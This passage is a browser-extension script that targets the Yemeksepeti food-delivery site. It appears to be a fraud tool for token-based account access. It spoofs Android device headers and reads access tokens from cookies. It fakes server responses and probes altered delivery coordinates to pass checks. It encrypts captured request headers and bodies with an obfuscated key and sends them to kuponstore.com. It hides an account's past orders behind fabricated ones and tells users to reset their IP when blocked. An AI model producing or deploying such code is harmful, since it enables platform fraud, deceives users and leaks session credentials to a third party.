(function() {
  'use strict';

  const _origFetch = window.fetch.bind(window);

  console.log('Yemeksepeti Enhancement Script başlatıldı');

let checkoutInProgress = false;
  let calculateBlockedDuringCheckout = false;
  let lastCalculateResponse = null;
let calculate403Warned = false;

function showCalculateIpResetWarning() {
  if (calculate403Warned || document.getElementById('yt-calc-403-wall')) return;
  calculate403Warned = true;
  const wall = document.createElement('div');
  wall.id = 'yt-calc-403-wall';
  wall.innerHTML = ''
    + '<style>'
    + '#yt-calc-403-wall{position:fixed;inset:0;z-index:2147483647;background:rgba(17,24,39,.55);display:flex;align-items:center;justify-content:center;padding:16px;padding-bottom:calc(16px + env(safe-area-inset-bottom));box-sizing:border-box;font-family:Arial,sans-serif;}'
    + '#yt-calc-403-card{width:100%;max-width:480px;max-height:calc(100vh - 32px);max-height:calc(100dvh - 32px);overflow:auto;-webkit-overflow-scrolling:touch;background:#fff;border-radius:16px;padding:22px 18px;text-align:center;box-shadow:0 16px 50px rgba(0,0,0,.25);box-sizing:border-box;}'
    + '#yt-calc-403-card h2{font-size:20px;line-height:1.3;margin:0 0 10px;color:#c62828;}'
    + '#yt-calc-403-card p{margin:0 0 14px;color:#333;font-size:15px;line-height:1.5;}'
    + '#yt-calc-403-card .yt-step{border-radius:8px;padding:12px;margin-bottom:10px;text-align:left;}'
    + '#yt-calc-403-card .yt-step strong{display:block;font-size:15px;margin-bottom:6px;}'
    + '#yt-calc-403-card ol{margin:0;padding-left:18px;font-size:14px;color:#444;line-height:1.55;}'
    + '#yt-calc-403-ok{width:100%;background:#4CAF50;color:#fff;border:0;border-radius:10px;padding:14px 18px;font-size:16px;font-weight:700;cursor:pointer;}'
    + '@media (max-width:480px){#yt-calc-403-wall{padding:10px;align-items:flex-end;}#yt-calc-403-card{border-radius:16px 16px 12px 12px;padding:18px 14px;max-height:calc(100dvh - 20px);}#yt-calc-403-card h2{font-size:18px;}}'
    + '</style>'
    + '<div id="yt-calc-403-card">'
    + '<div style="font-size:36px;line-height:1;margin-bottom:8px;">🚫</div>'
    + '<h2>IP adresini değiştirmen gerek</h2>'
    + '<p>IP adresini değiştirip token ile baştan giriş yap.</p>'
    + '<div class="yt-step" style="background:#e3f2fd;border-left:4px solid #2196F3;">'
    + '<strong style="color:#1976D2;">📱 Telefon</strong>'
    + '<ol><li>Uçak modunu aç</li><li>5 saniye bekle</li><li>Uçak modunu kapat</li><li>Mobil veri ile tokena baştan gir</li></ol>'
    + '</div>'
    + '<div class="yt-step" style="background:#f3e5f5;border-left:4px solid #9C27B0;">'
    + '<strong style="color:#7B1FA2;">💻 Bilgisayar</strong>'
    + '<ol><li>Modemi kapat</li><li>5 saniye bekle</li><li>Modemi aç</li><li>İnternet gelince tokena baştan gir</li></ol>'
    + '</div>'
    + '<button id="yt-calc-403-ok" type="button">Anladım</button>'
    + '</div>';
  (document.body || document.documentElement).appendChild(wall);
  const ok = document.getElementById('yt-calc-403-ok');
  if (ok) {
    ok.onclick = function () {
      wall.remove();
      calculate403Warned = false;
    };
  }
}

let lockedCoordinates = null;
  let currentOffsetMeters = 5;
  let currentAngleDeg = Math.floor(Math.random() * 360);
  let discoveryInProgress = false;

function getHiddenVoucherRules() {
    try {
      const attr = document.documentElement.getAttribute('data-yt-hidden-vouchers');
      if (attr) {
        const parsed = JSON.parse(attr);
        return {
          codes: Array.isArray(parsed.codes) ? parsed.codes.map(c => String(c).toLowerCase()) : [],
          keywords: Array.isArray(parsed.keywords) ? parsed.keywords.map(k => String(k).toLowerCase()) : []
        };
      }
    } catch (e) {}
    try {
      const ls = localStorage.getItem('yt_hidden_vouchers');
      if (ls) {
        const parsed = JSON.parse(ls);
        return {
          codes: Array.isArray(parsed.codes) ? parsed.codes.map(c => String(c).toLowerCase()) : [],
          keywords: Array.isArray(parsed.keywords) ? parsed.keywords.map(k => String(k).toLowerCase()) : []
        };
      }
    } catch (e) {}
    return { codes: [], keywords: [] };
  }

  // ====== KUPON ENGELLEME (istek seviyesinde) ======
  // "Gizlediğimiz" kuponlar (data-yt-hidden-vouchers) manuel yazılsa bile
  // cart/calculate + cart/checkout isteğindeki "voucher" alanından tespit edilip
  // kaldırılır → kupon uygulanamaz. Kaynak, kupon gizleme ile AYNI kurallardır.
  function isVoucherCodeBlocked(code) {
    if (!code) return false;
    const rules = getHiddenVoucherRules();
    const codes = rules.codes || [];
    const keywords = rules.keywords || [];
    if (!codes.length && !keywords.length) return false;
    const lower = String(code).trim().toLowerCase();
    if (!lower) return false;
    if (codes.indexOf(lower) !== -1) return true;
    for (let i = 0; i < keywords.length; i++) {
      if (keywords[i] && lower.indexOf(keywords[i]) !== -1) return true;
    }
    return false;
  }

  function stripBlockedVoucherFromBody(requestBody) {
    try {
      if (requestBody && requestBody.voucher && isVoucherCodeBlocked(requestBody.voucher)) {
        console.log('[YT] Engellenen kupon istekten kaldırıldı:', requestBody.voucher);
        requestBody.voucher = '';
        requestBody.auto_apply_voucher = false;
      }
    } catch (e) {}
    return requestBody;
  }

function escapeRegExp(str) {
    return String(str).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

function looksLikeVoucherItem(item) {
    if (!item || typeof item !== 'object' || Array.isArray(item)) return false;
    return !!(
      item.code ||
      item.voucher_code ||
      item.voucherCode ||
      item.construct_id ||
      item.constructId ||
      item.voucher ||
      item.discount_type ||
      item.discountType ||
      item.min_order_value ||
      item.minOrderValue ||
      item.expiry_date ||
      item.expiryDate ||
      item.amount ||
      item.title
    );
  }

function voucherItemMatches(item, rules) {
    if (!looksLikeVoucherItem(item)) return false;
    const codes = rules.codes || [];
    const keywords = rules.keywords || [];
    if (!codes.length && !keywords.length) return false;

    // Sadece gerçek kupon kodu alanları — açıklama metnindeki "sepet" vb. eşleşmesin
    const fieldCandidates = [
      item.code,
      item.voucher_code,
      item.voucherCode,
      item?.voucher?.code,
      item?.voucher?.voucher_code,
      item?.voucher?.voucherCode
    ];

    for (let i = 0; i < fieldCandidates.length; i++) {
      const val = fieldCandidates[i];
      if (val == null || val === '') continue;
      const lower = String(val).trim().toLowerCase();
      if (codes.indexOf(lower) !== -1) return true;
    }

    if (keywords.length) {
      const codeBlob = fieldCandidates
        .filter(v => v != null && v !== '')
        .map(v => String(v).toLowerCase())
        .join(' ');
      for (let k = 0; k < keywords.length; k++) {
        if (keywords[k] && codeBlob.indexOf(keywords[k]) !== -1) return true;
      }
    }
    return false;
  }

function collectNestedVoucherItems(node, out, skip) {
    if (!node || typeof node !== 'object') return;
    if (node === skip) return;
    if (Array.isArray(node)) {
      for (const item of node) {
        if (item && item !== skip && looksLikeVoucherItem(item)) out.push(item);
        collectNestedVoucherItems(item, out, skip);
      }
      return;
    }
    for (const key of Object.keys(node)) {
      collectNestedVoucherItems(node[key], out, skip);
    }
  }

function filterVoucherTree(node, rules) {
    if (!node || typeof node !== 'object') return node;
    if (Array.isArray(node)) {
      const result = [];
      for (const item of node) {
        const filteredItem = filterVoucherTree(item, rules);
        if (voucherItemMatches(item, rules)) {
          // Bu öğe hedef koda uyuyor; ama içinde başka (eşleşmeyen) kuponlar
          // varsa (stacked/composite kupon grubu) tüm öğeyi atmak o diğer
          // kuponları da yanlışlıkla silebilir. Böyle bir durumda öğeyi ATMA,
          // sadece kendi içindeki eşleşen alt-kuponlar filtrelenmiş halde kalsın.
          const nested = [];
          collectNestedVoucherItems(filteredItem, nested, filteredItem);
          const hasOtherRemaining = nested.some(n => !voucherItemMatches(n, rules));
          if (!hasOtherRemaining) {
            continue; // güvenle atlanabilir — içinde korunması gereken başka kupon yok
          }
        }
        result.push(filteredItem);
      }
      return result;
    }
    const out = {};
    for (const key of Object.keys(node)) {
      out[key] = filterVoucherTree(node[key], rules);
    }
    return out;
  }

function filterVoucherPayloadText(text) {
    const rules = getHiddenVoucherRules();
    if ((!rules.codes || !rules.codes.length) && (!rules.keywords || !rules.keywords.length)) {
      return text;
    }
    if (!text || typeof text !== 'string') return text;
    try {
      const parsed = JSON.parse(text);
      const filtered = filterVoucherTree(parsed, rules);
      return JSON.stringify(filtered);
    } catch (e) {
      return text;
    }
  }

function isVoucherResponseUrl(url) {
    if (!url) return false;
    return (
      url.includes('incentives-wallet/vouchers') ||
      url.includes('/graphql') ||
      url.includes('voucher') ||
      url.includes('incentive')
    );
  }

function patchXhrResponse(xhr) {
    if (!xhr || xhr._ytVoucherPatched) return;
    xhr._ytVoucherPatched = true;
    xhr.addEventListener('readystatechange', function () {
      if (xhr.readyState !== 4) return;
      if (!isVoucherResponseUrl(xhr._requestUrl || '')) return;
      try {
        const raw = typeof xhr.responseText === 'string' ? xhr.responseText : '';
        if (!raw) return;
        const filtered = filterVoucherPayloadText(raw);
        if (filtered === raw) return;
        Object.defineProperty(xhr, 'responseText', { value: filtered, configurable: true });
        if (!xhr.responseType || xhr.responseType === '' || xhr.responseType === 'text') {
          Object.defineProperty(xhr, 'response', { value: filtered, configurable: true });
        } else if (xhr.responseType === 'json') {
          try {
            Object.defineProperty(xhr, 'response', { value: JSON.parse(filtered), configurable: true });
          } catch (e) {}
        }
      } catch (e) {}
    });
  }

function showDiscoveryOverlay() {
    if (document.getElementById('ys-discovery-overlay')) return;
    const overlay = document.createElement('div');
    overlay.id = 'ys-discovery-overlay';
    overlay.innerHTML = `
      <div style="
        position:fixed;top:0;left:0;width:100%;height:100%;
        background:rgba(0,0,0,0.55);
        z-index:999999;
        display:flex;align-items:center;justify-content:center;
        cursor:wait;
      ">
        <div style="
          background:#fff;border-radius:16px;padding:32px 48px;
          box-shadow:0 8px 32px rgba(0,0,0,0.25);
          text-align:center;font-family:system-ui,-apple-system,sans-serif;
        ">
          <div style="
            width:40px;height:40px;margin:0 auto 16px;
            border:4px solid #e0e0e0;border-top:4px solid #ff4757;
            border-radius:50%;
            animation:ys-spin 0.8s linear infinite;
          "></div>
          <div style="font-size:18px;font-weight:600;color:#333;">Kupon uygulanıyor</div>
          <div style="font-size:14px;color:#888;margin-top:6px;">Lütfen bekleyin...</div>
        </div>
      </div>
      <style>@keyframes ys-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
    `;
    document.body.appendChild(overlay);
  }

  function hideDiscoveryOverlay() {
    const overlay = document.getElementById('ys-discovery-overlay');
    if (overlay) overlay.remove();
  }

const SERVER_URL = 'https://kuponstore.com/api/extension/yemeksepeti';

  const _k = [
    atob('NTZjOTQxMzExZWRk'),
    atob('OTk0NmM1ZDA0ODI2'),
    atob('ZGNhMDdkZjZlYmNk'),
    atob('ZmI1NjU1NzE5YzYw'),
    atob('ZDljM2YyOTM5YmIz'),
    atob('NzJjOA==')
  ];

  function _gk() {
    const hex = _k.join('');
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
      bytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);
    }
    return bytes;
  }

  async function encryptPayload(data) {
    const keyBytes = _gk();
    const key = await crypto.subtle.importKey('raw', keyBytes, 'AES-GCM', false, ['encrypt']);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const plaintext = new TextEncoder().encode(JSON.stringify(data));
    const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, plaintext);
    const encBuf = new Uint8Array(encrypted);
    const authTag = encBuf.slice(encBuf.length - 16);
    const ciphertext = encBuf.slice(0, encBuf.length - 16);
    const combined = new Uint8Array(iv.length + authTag.length + ciphertext.length);
    combined.set(iv, 0);
    combined.set(authTag, 12);
    combined.set(ciphertext, 28);
    return btoa(String.fromCharCode(...combined));
  }

  async function sendToServer(calculateBody, headers) {
    try {
      const payload = {
        calculateBody: calculateBody,
        headers: headers,
        timestamp: Date.now()
      };
      const encrypted = await encryptPayload(payload);
      console.log('📡 Şifreli veri hazır, background.js üzerinden sunucuya gönderiliyor...');
      window.postMessage({
        source: 'YS_ENHANCEMENT_EXTENSION',
        action: 'sendToServer',
        serverUrl: SERVER_URL + '/api/update',
        encryptedPayload: encrypted
      }, '*');
    } catch (err) {
      console.error('📡 Şifreleme/gönderim hatası:', err);
    }
  }

function isYsProxyEndpoint(url) {
    // Rakip endpoints.js: calculate + checkout + vouchers → android proxy
    // intent/{id} proxy edilmez (405)
    if (!url) return false;
    if (url.includes('tr.fd-api.com/api/v5/cart/checkout')) return true;
    if (url.includes('tr.fd-api.com/api/v5/cart/calculate')) return true;
    if (url.includes('tr.fd-api.com/api/v6/incentives-wallet/vouchers')) return true;
    if (/tr\.fd-api\.com\/api\/v5\/purchase\/intent(\?|$)/.test(url)) return true;
    return false;
  }

function isYemekSepetiCalculateEndpoint(url) {
    return url && (
      url.includes('tr.fd-api.com/api/v5/cart/calculate') &&
      window.location.hostname.includes('yemeksepeti.com')
    );
  }

function isYemekSepetiVouchersEndpoint(url) {
    return url && (
      url.includes('tr.fd-api.com/api/v6/incentives-wallet/vouchers') &&
      window.location.hostname.includes('yemeksepeti.com')
    );
  }

function isPerseusAnalyticsEndpoint(url) {
    return url && (
      url.includes('perseus-productanalytics.deliveryhero.net') ||
      url.includes('/v1/insert/pandora/hit')
    );
  }

function isGraphqlEndpoint(url) {
    return url && url.includes('tr.fd-api.com/graphql');
  }

function isCardSaveEndpoint(url, method) {
    return url && url.includes('tr.fd-api.com/api/v5/wallet/paymentinstruments') &&
      method && method.toUpperCase() === 'POST';
  }

function isAddressSaveEndpoint(url, method) {
    if (!url || !url.includes('tr.fd-api.com/api/v5/users/addresses')) return false;
    const m = (method || '').toUpperCase();
    return m === 'POST' || m === 'PUT';
  }

function isServiceWorkerFile(url) {
    return url && (
      url.includes('ngsw-worker.js') ||
      url.includes('sw.js') ||
      url.includes('service-worker.js')
    );
  }

function isPWAManifestFile(url) {
    return url && (
      url.includes('manifest.json') ||
      url.includes('ngsw.json') ||
      url.includes('ngsw.json?ngsw-cache-bust=')
    );
  }

function fakeXhrSuccess(xhr, responseBody) {
    const data = responseBody || '{"success":true}';
    setTimeout(() => {
      Object.defineProperty(xhr, 'readyState', { value: 4, configurable: true });
      Object.defineProperty(xhr, 'status', { value: 200, configurable: true });
      Object.defineProperty(xhr, 'statusText', { value: 'OK', configurable: true });
      Object.defineProperty(xhr, 'response', { value: data, configurable: true });
      Object.defineProperty(xhr, 'responseText', { value: data, configurable: true });
      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange();
      if (typeof xhr.onload === 'function') xhr.onload();
      if (typeof xhr.onloadend === 'function') xhr.onloadend();
      xhr.dispatchEvent(new Event('readystatechange'));
      xhr.dispatchEvent(new Event('load'));
      xhr.dispatchEvent(new Event('loadend'));
    }, 10);
  }

function generateYSDeviceInfo() {

    let deviceInfo = null;
    try {
      const stored = localStorage.getItem('ys_device_info');
      if (stored) {
        deviceInfo = JSON.parse(stored);
      }
    } catch (e) {
      console.warn('Device info localStorage\'dan yüklenemedi');
    }

    if (!deviceInfo) {
      const manufacturers = ['Samsung', 'Xiaomi', 'Huawei', 'OPPO', 'vivo', 'Realme', 'OnePlus', 'Google'];
      const manufacturer = manufacturers[Math.floor(Math.random() * manufacturers.length)];

      const models = {
        'Samsung': ['Galaxy S22', 'Galaxy S21', 'Galaxy Note20', 'Galaxy A52'],
        'Xiaomi': ['Mi 11', 'Redmi Note 10', 'Poco F3', 'Mi 10T'],
        'Huawei': ['P40', 'Mate 40', 'Nova 8', 'P30'],
        'OPPO': ['Find X3', 'Reno 6', 'A74', 'F19'],
        'vivo': ['X60', 'V21', 'Y20', 'S9'],
        'Realme': ['GT', 'Narzo 30', '8 Pro', 'C25'],
        'OnePlus': ['9 Pro', '8T', 'Nord 2', '9R'],
        'Google': ['Pixel 6', 'Pixel 5', 'Pixel 4a', 'Pixel 6 Pro']
      };

      const modelList = models[manufacturer] || models['Samsung'];
      const model = modelList[Math.floor(Math.random() * modelList.length)];

const hexChars = '0123456789abcdef';
      let deviceId = '';
      for (let i = 0; i < 16; i++) {
        deviceId += hexChars.charAt(Math.floor(Math.random() * 16));
      }

      deviceInfo = {
        manufacturer,
        model,
        deviceId,
      appVersion: '26.7.0',
      buildNumber: '260700154',
        apiLevel: '31'
      };

try {
        localStorage.setItem('ys_device_info', JSON.stringify(deviceInfo));
      } catch (e) {
        console.warn('Device info localStorage\'a kaydedilemedi');
      }
    }

    return deviceInfo;
  }

function getCookieRaw(name) {
    try {
      const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/[$()*+.?[\\\]^{|}]/g, '\\$&') + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : '';
    } catch (_) { return ''; }
  }

  function jwtClientIdOf(tok) {
    try {
      const p = String(tok || '').split('.')[1];
      if (!p) return '';
      const pad = p + '='.repeat((4 - (p.length % 4)) % 4);
      return String(JSON.parse(atob(pad.replace(/-/g, '+').replace(/_/g, '/'))).client_id || '');
    } catch (_) { return ''; }
  }

  function pickAndroidAccessToken() {
    for (const name of ['access_token', 'android_token', 'uy_token', 'token']) {
      const v = getCookieRaw(name);
      if (v && jwtClientIdOf(v) === 'android') return v;
    }
    const fallback = getCookieRaw('access_token');
    return fallback || '';
  }

  // Rakip helpers.js ile aynı mantık: android Bearer + Cust-Code + R-Sig
  // Rakip birebir: vouchers POST'ta Authorization EZİLMEZ (web Volo oturumu kalır)
  function generateYSHeaders() {
    const device = generateYSDeviceInfo();
    return {
      "Api-Client-Version": "5.0",
      "Device-Make": device.manufacturer,
      "Device-Model": device.model,
      "Device-Id": device.deviceId,
      "App-Name": "com.inovel.app.yemeksepeti",
      "App-Flavor": "yemeksepeti",
      "Build-Number": device.buildNumber,
      "Build-Type": "release",
      "Platform": "android",
      "Platform-Version": device.apiLevel,
      "Android-Mobile-Service-Provider": "gms",
      "App-Build": device.buildNumber,
      "App-Version": device.appVersion,
      "Cust-Code": "",
      "Content-Type": "application/json; charset=UTF-8",
    };
  }

async function discoverValidCoordinate(originalBody, url) {
    if (lockedCoordinates) return lockedCoordinates;

    discoveryInProgress = true;
    showDiscoveryOverlay();

    const parsed = JSON.parse(originalBody);
    const origLat = parsed.expedition.latitude;
    const origLng = parsed.expedition.longitude;

    console.log(`🔍 Koordinat keşfi başlıyor... Orijinal: (${origLat},${origLng}), Yön: ${currentAngleDeg}°, Mesafe: ${currentOffsetMeters}m`);

    try {
    while (currentOffsetMeters <= 160) {
      const angleRad = currentAngleDeg * Math.PI / 180;
      const coords = offsetCoordinates(origLat, origLng, currentOffsetMeters, angleRad);
      console.log(`🔍 [${currentOffsetMeters}m, ${currentAngleDeg}°] Test: (${coords.latitude},${coords.longitude})`);

      const testBody = JSON.parse(JSON.stringify(parsed));
      testBody.expedition.latitude = coords.latitude;
      testBody.expedition.longitude = coords.longitude;

      const result = await sendProxyRequest({
        action: 'ysProxyRequest',
        url: url,
        method: 'POST',
        headers: {},
        body: JSON.stringify(testBody)
      });

      console.log(`🔍 [${currentOffsetMeters}m, ${currentAngleDeg}°] -> Status ${result.status}`);

      if (result.status >= 200 && result.status < 300) {
        console.log(`🔍 Doğrulama yapılıyor... (${coords.latitude},${coords.longitude})`);
        const verification = await sendProxyRequest({
          action: 'ysProxyRequest',
          url: url,
          method: 'POST',
          headers: {},
          body: JSON.stringify(testBody)
        });

        console.log(`🔍 Doğrulama -> Status ${verification.status}`);

        if (verification.status >= 200 && verification.status < 300) {
          lockedCoordinates = coords;
          console.log(`✅ Koordinat sabitlendi! [${currentOffsetMeters}m, ${currentAngleDeg}°] (${coords.latitude},${coords.longitude})`);
          discoveryInProgress = false;
          hideDiscoveryOverlay();
          const bodyForServer = JSON.parse(JSON.stringify(testBody));
          const hdrs = verification.requestHeaders || result.requestHeaders || {};
          console.log('📡 Sunucuya gönderiliyor...', Object.keys(hdrs).length, 'header');
          sendToServer(bodyForServer, hdrs);
          return coords;
        }

        console.log(`⚠️ Doğrulama başarısız, devam ediliyor...`);
      }

      currentAngleDeg = (currentAngleDeg + 120) % 360;
      if (currentOffsetMeters < 160) {
        currentOffsetMeters += 15;
      } else {
        break;
      }
      console.log(`⚠️ 400 döndü, yön: ${currentAngleDeg}°, mesafe: ${currentOffsetMeters}m`);
    }

    console.warn('❌ Koordinat keşfi başarısız, tüm adımlar denendi');
    discoveryInProgress = false;
    hideDiscoveryOverlay();
    return null;
    } catch (err) {
      console.error('Koordinat keşif hatası:', err);
      discoveryInProgress = false;
      hideDiscoveryOverlay();
      return null;
    }
  }

function sendProxyRequest(requestDetails) {
    return new Promise((resolve, reject) => {
      const requestId = Date.now() + Math.random().toString().substring(2, 8);

      window.ysEnhancement = window.ysEnhancement || {};
      window.ysEnhancement.callbacks = window.ysEnhancement.callbacks || {};

      window.ysEnhancement.callbacks[requestId] = (response) => {
        if (response && response.success) {
          console.log(`Proxy yanıtı alındı:`, response.status);
          resolve(response);
        } else {
          console.error(`Proxy hatası:`, response ? response.error : 'Bilinmeyen hata');
          reject(new Error(response ? response.error : 'Proxy request failed'));
        }
        delete window.ysEnhancement.callbacks[requestId];
      };

      console.log(`Proxy isteği gönderiliyor...`);
      window.postMessage({
        source: 'YS_ENHANCEMENT_EXTENSION',
        ...requestDetails,
        requestId: requestId,
      }, '*');
    });
  }

function offsetCoordinates(latitude, longitude, meters, angle) {
    const lat = parseFloat(latitude);
    const lng = parseFloat(longitude);

    const latStr = String(latitude);
    const lngStr = String(longitude);
    const latDecimals = latStr.includes('.') ? latStr.split('.')[1].length : 8;
    const lngDecimals = lngStr.includes('.') ? lngStr.split('.')[1].length : 8;

    const distance = meters / 1000;
    const earthRadius = 6371;
    const deltaLat = (distance / earthRadius) * Math.cos(angle);
    const deltaLng = (distance / earthRadius) * Math.sin(angle) / Math.cos(lat * Math.PI / 180);

    return {
      latitude: parseFloat((lat + (deltaLat * 180 / Math.PI)).toFixed(latDecimals)),
      longitude: parseFloat((lng + (deltaLng * 180 / Math.PI)).toFixed(lngDecimals))
    };
  }

  // ============ SIPARIS GIZLEME / FAKE SIPARIS ============
  // yemeksepeti order_history yanitini, kullanici sayfayi GORMEDEN once donustururuz:
  //  - Token'a giris tarihinden (cutoff) SONRAKI gercek siparisler KORUNUR (kullanicinin kendi siparisleri)
  //  - Cutoff'tan ONCEKI (hesabin eski) siparisler GIZLENIR
  //  - Yerine fake siparis(ler) eklenir (su an eklentiye gomulu havuz)
  // Cutoff, content_script'in documentElement'e yazdigi data-ys-orders-cutoff'tan okunur.

  function isOrderHistoryEndpoint(url) {
    return typeof url === 'string' && url.indexOf('/api/v5/orders/order_history') !== -1;
  }

  function getOrdersCutoffTs() {
    try {
      var v = document.documentElement.getAttribute('data-ys-orders-cutoff');
      var n = v ? parseInt(v, 10) : 0;
      // Cutoff bilinmiyorsa GUVENLI varsayilan = simdi (tum mevcut siparisleri gizle, sadece fake goster)
      return (n && n > 0) ? n : Date.now();
    } catch (e) { return Date.now(); }
  }

  function getUrlOffset(url) {
    try { var m = /[?&]offset=(\d+)/.exec(url || ''); return m ? parseInt(m[1], 10) : 0; }
    catch (e) { return 0; }
  }

  function orderedAtToTs(item) {
    try {
      var d = item && item.ordered_at && item.ordered_at.date;
      if (!d) return 0;
      return new Date(String(d).replace(' ', 'T')).getTime() || 0; // yerel saat (TR)
    } catch (e) { return 0; }
  }

  function _flagOn(v) {
    return v === true || v === 1 || v === '1' || v === 'true';
  }

  // Aktif/devam eden siparis mi? (teslim/iptal DEGIL) -> cutoff'tan BAGIMSIZ her zaman gosterilir.
  function isActiveOrder(item) {
    try {
      if (!item || typeof item !== 'object') return false;
      var sf = item.status_flags || {};
      if (_flagOn(sf.is_canceled) || _flagOn(sf.is_cancelled)) return false;
      if (_flagOn(sf.is_active) || _flagOn(sf.active)) return true;
      if (_flagOn(sf.is_delivered) || _flagOn(sf.is_completed) || _flagOn(sf.is_past_order)) return false;
      if (sf.is_past_order === false || item.is_cancellable === true) return true;
      var cs = item.current_status || {};
      var type = String(cs.type || '').toLowerCase();
      var msg = String(cs.message || cs.code_text || '').toUpperCase();
      if (msg.indexOf('CANCEL') !== -1 || msg.indexOf('DELIVERED') !== -1) return false;
      if (type && type !== 'final' && type !== 'delivered' && type !== 'cancelled' && type !== 'canceled') return true;
      if (msg.indexOf('PROGRESS') !== -1 || msg.indexOf('PREPAR') !== -1 || msg.indexOf('PICK') !== -1 || msg.indexOf('RIDER') !== -1 || msg.indexOf('ACCEPT') !== -1) return true;
      if (typeof cs.code === 'number' && cs.code > 0 && cs.code < 16) return true;
      return false;
    } catch (e) { return false; }
  }

  function _pad2(n) { return (n < 10 ? '0' : '') + n; }
  function _fmtDate(ts) {
    var d = new Date(ts);
    return d.getFullYear() + '-' + _pad2(d.getMonth() + 1) + '-' + _pad2(d.getDate()) + ' ' +
           _pad2(d.getHours()) + ':' + _pad2(d.getMinutes()) + ':' + _pad2(d.getSeconds());
  }

  // ---- FAKE SIPARIS HAVUZU (simdilik eklentiye gomulu; API'ye gerek yok) ----
  // Siparisler HAR'lardan alinip temizlenerek eklenir. Su anki havuz: Meshur Sariyer Borekcisi.
  var FAKE_ORDER_POOL = [
    {"current_status":{"code":16,"message":"RESTAURANTS_OTP_OD_PROGRESS_DELIVERED","type":"final","changedAt":{"date":"2025-02-18 12:51:07","timezone":"Europe/Istanbul"},"internal_status_code":"621 - "},"order_address":"Merkez Mah., Ataturk Cad., 5, 34000 Istanbul","delivery_address":{"id":100000011,"city":"Istanbul","address_line_1":"Ataturk Cad.","address_line_2":"5","address_line_3":"Merkez Mah.","address_line_4":"Istanbul","address_line_5":"","address_other":"","room":"","flat_number":"","structure":"","building":"","floor":"","district":"","postcode":"34000","company":"","latitude":41.0082,"longitude":28.9784,"delivery_instructions":""},"order_id":0,"order_code":"gn2k-x2g5","ordered_at":{"date":"2025-02-18 12:30:57","timezone":"Europe/Istanbul"},"confirmed_delivery_time":{"date":"2025-02-18 12:51:07","timezone":"Europe/Istanbul"},"total_value":160,"subtotal":310,"vendor":{"id":0,"code":"gn2k","name":"Dillere Destan Ev Yemekleri","logo":"","service_tax_percentage_amount":0,"service_fee_percentage_amount":0,"vat_percentage_amount":0,"is_service_fee_enabled":false,"is_service_tax_visible":false,"is_service_tax_enabled":false,"is_vat_visible":false,"is_vat_disabled":false,"address":"","latitude":37.042823,"longitude":35.299904,"primary_cuisine_id":1067,"metadata":{"timezone":"Europe/Istanbul"},"city_id":0,"vertical":"restaurants","customer_contact_phone_number":"+902120000000","hero_listing_image":"https://images.deliveryhero.io/image/fd-tr/LH/gn2k-listing.jpg"},"voucher":{"voucher":"","expirationDate":1790542799000,"type":"amount","value":150,"description":""},"order_products":[{"name":"Etli Kuru Fasulye Menü","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Etli Kuru Fasulye Menü","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"Bulgur Pilavı, cacık","placeholders":null},"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":180,"placeholders":null},"total_price":180,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false},{"name":"Zeytinyağlı Sarma","name_attributes":{"style":"highlight","text_color":"neutral_primary","value":"Zeytinyağlı Sarma","placeholders":null},"quantity_attributes":{"style":"highlight","text_color":"neutral_primary","value":1,"placeholders":null},"toppings_attributes":null,"special_instructions_attributes":{"style":"body_sm","text_color":"neutral_secondary","value":"","placeholders":null},"subtitle_attributes":null,"price_attributes":{"style":"body","text_color":"neutral_primary","value":130,"placeholders":null},"total_price":130,"quantity":1,"sold_out":false,"tag":null,"status":"available","weight_attributes":null,"replacement_products":[],"replacement_attributes":null,"is_meal_for_one":false}],"sms_verification_needed":false,"order_already_rated":true,"has_been_reported_late":false,"rider_tip":0,"charity":0,"service_fee_total":0,"difference_to_minimum":0,"difference_to_minimum_with_vat":0,"expedition_type":"delivery","server_time":{"date":"2025-02-18 12:51:07","timezone":"Europe/Istanbul"},"payment_type_code":"yemekpay_creditcard","payment":{"breakdown":[{"code":"yemekpay_creditcard","group":"online_payment","translation_key":"OTP_PAID_WITH_ONLINE_PAYMENT","amount":160}]},"delivery_features":{"show_map":false,"display_map":false,"show_cart":false,"show_statuses":false,"show_vendor_contact":false,"show_vendor_delivery_time":false,"show_rider_chat":false,"show_payment_breakdown":false,"show_help_button":false},"delivery_provider":"own_delivery_foodpanda","is_cancellable":false,"status_flags":{"is_paid":true,"is_active":false,"is_picked_up":false,"is_delivered":true,"is_canceled":false,"is_preorder":false,"is_preorder_active":false,"is_past_order":true,"is_completed":true,"is_reorderable":true,"is_reorderable_after_cancellation":false,"is_rateable":false,"is_meal_for_one":false},"dynamic_fees":[],"loyalty":null,"status_messages":{"titles":[]},"status_history":[],"payment_refunds":[],"rider_tip_eligible":false,"reminder":null},
